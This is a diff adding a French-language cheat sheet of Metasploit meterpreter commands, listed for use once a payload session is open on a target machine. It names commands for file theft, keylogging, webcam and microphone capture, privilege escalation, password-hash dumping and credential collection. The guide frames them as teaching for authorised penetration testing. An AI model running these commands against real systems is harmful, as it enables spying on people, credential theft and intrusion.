@@ -86,3 +86,65 @@ Une fois que le payload est exécuté sur la machine cible, la session `meterpre
 
 ### **Note Importante** :
 Cette procédure est réservée aux tests de pénétration éthiques et autorisés sur des systèmes pour lesquels vous avez obtenu la permission. Toute utilisation non autorisée est illégale et contraire à l'éthique.
+
+
+
+
+
+
+Une fois que le payload a été installé et que la session `meterpreter` est ouverte sur la machine cible, voici une liste des commandes que vous pouvez utiliser dans Metasploit pour interagir avec la session :
+
+### Commandes de base `meterpreter`
+1. **`help`** : Affiche toutes les commandes disponibles.
+2. **`sysinfo`** : Affiche les informations système de la machine cible.
+3. **`getuid`** : Affiche l'utilisateur actuellement utilisé sur la machine cible.
+4. **`getpid`** : Affiche le PID (Process ID) du processus `meterpreter`.
+5. **`ps`** : Liste les processus en cours sur la machine cible.
+6. **`shell`** : Ouvre un shell Windows sur la machine cible.
+7. **`exit`** : Ferme la session `meterpreter`.
+
+### Commandes de gestion de fichiers
+1. **`ls`** : Liste les fichiers et dossiers du répertoire courant.
+2. **`cd <chemin>`** : Change de répertoire.
+3. **`pwd`** : Affiche le répertoire courant.
+4. **`download <fichier>`** : Télécharge un fichier de la machine cible vers la machine attaquante.
+5. **`upload <fichier>`** : Envoie un fichier de la machine attaquante vers la machine cible.
+6. **`rm <fichier>`** : Supprime un fichier sur la machine cible.
+7. **`mkdir <dossier>`** : Crée un nouveau dossier sur la machine cible.
+
+### Commandes de gestion de processus
+1. **`kill <PID>`** : Tue un processus spécifique sur la machine cible.
+2. **`migrate <PID>`** : Migre le `meterpreter` vers un autre processus (utile pour la persistance).
+
+### Commandes de contrôle de session
+1. **`background`** : Met la session `meterpreter` en arrière-plan.
+2. **`sessions`** : Liste toutes les sessions actives.
+3. **`sessions -i <ID>`** : Interagit avec une session spécifique.
+
+### Commandes réseau
+1. **`portfwd add -l <port_local> -p <port_distant> -r <IP_cible>`** : Ajoute un port forwarding.
+2. **`ifconfig`** : Affiche les interfaces réseau de la machine cible.
+3. **`route`** : Gère et affiche les routes sur la machine cible.
+4. **`arp`** : Affiche la table ARP de la machine cible.
+
+### Commandes de capture et de surveillance
+1. **`screenshot`** : Prend une capture d'écran de la machine cible.
+2. **`webcam_list`** : Liste les webcams disponibles sur la machine cible.
+3. **`webcam_snap`** : Prend une photo avec la webcam.
+4. **`record_mic`** : Enregistre le micro pendant une durée définie.
+5. **`keyscan_start`** : Démarre l'enregistrement des frappes de touches (keylogging).
+6. **`keyscan_dump`** : Affiche les frappes enregistrées.
+7. **`keyscan_stop`** : Arrête l'enregistrement des frappes.
+
+### Commandes de persistance et d'exploitation avancée
+1. **`run persistence -h`** : Affiche les options pour configurer la persistance sur la machine cible.
+2. **`run getsystem`** : Tente de passer en tant qu'utilisateur `SYSTEM`.
+3. **`hashdump`** : Extrait les hachages de mots de passe (nécessite des privilèges élevés).
+4. **`run post/windows/gather/credentials/credentials_collector`** : Collecte les informations d'identification de la machine cible.
+
+### Commandes de gestion de l'écran et de la webcam
+1. **`webcam_stream`** : Diffuse un flux vidéo en direct de la webcam de la cible.
+2. **`screenshare`** : Partage l'écran en temps réel.
+
+### **Conseil de Sécurité**
+Ces commandes doivent être utilisées dans le cadre de tests de pénétration éthiques, et uniquement avec l'autorisation explicite des propriétaires des systèmes ciblés. Toute utilisation non autorisée de ces techniques est illégale et contraire à l'éthique.
